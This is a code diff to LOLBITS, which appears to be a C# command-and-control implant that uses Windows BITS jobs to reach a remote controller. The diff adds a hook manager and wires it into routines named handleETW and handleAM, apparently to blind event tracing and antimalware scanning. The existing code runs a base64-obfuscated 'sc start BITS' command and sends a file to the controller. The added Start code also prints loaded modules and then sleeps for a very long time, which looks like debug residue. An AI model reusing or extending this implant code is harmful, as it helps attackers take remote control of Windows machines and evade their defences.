@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
@@ -6,6 +7,7 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using LOLBITS.Loading;
+using LOLBITS.Protection;
 using LOLBITS.TokenManagement;
 using Newtonsoft.Json;
 using BITS = BITSReference2_5;
@@ -22,6 +24,7 @@ namespace LOLBITS.Controlling
         private readonly string _tempPath;
         private readonly TokenManager _tokenManager;
         private readonly Jobs _jobsManager;
+        private readonly HookManager _hookManager;
         private readonly SysCallManager _sysCall;
 
         public Controller(string id, string url,string password)
@@ -31,7 +34,7 @@ namespace LOLBITS.Controlling
             _jobsManager = new Jobs(url);
             _sysCall = new SysCallManager();
             _tokenManager = new TokenManager(_sysCall);
-
+            _hookManager = new HookManager(_sysCall);
             _tempPath = Environment.GetEnvironmentVariable("temp") ?? @"C:\Windows\Temp\";
         }
 
@@ -40,8 +43,21 @@ namespace LOLBITS.Controlling
             return _p;
         }
 
+        public void hookLdr()
+        {
+            _hookManager.Install();
+        }
+
         public void Start()
         {
+
+            Process proc = Process.GetCurrentProcess();
+
+            foreach (var module in proc.Modules)
+            {
+                Console.WriteLine(string.Format("Module: {0}", module.ToString()));
+            }
+            Thread.Sleep(20000000);
 
             string startBits = Encoding.UTF8.GetString(Convert.FromBase64String("c2Mgc3RhcnQgQklUUw=="));
             Utils.ExecuteCommand(startBits, _sysCall);
@@ -62,8 +78,8 @@ namespace LOLBITS.Controlling
 
             _jobsManager.Send(_id, filePath);
 
-            Utils.handleETW(_sysCall);
-            Utils.handleAM(_sysCall);
+            Utils.handleETW(_sysCall, _hookManager);
+            Utils.handleAM(_sysCall, _hookManager);
 
 
             Loop();
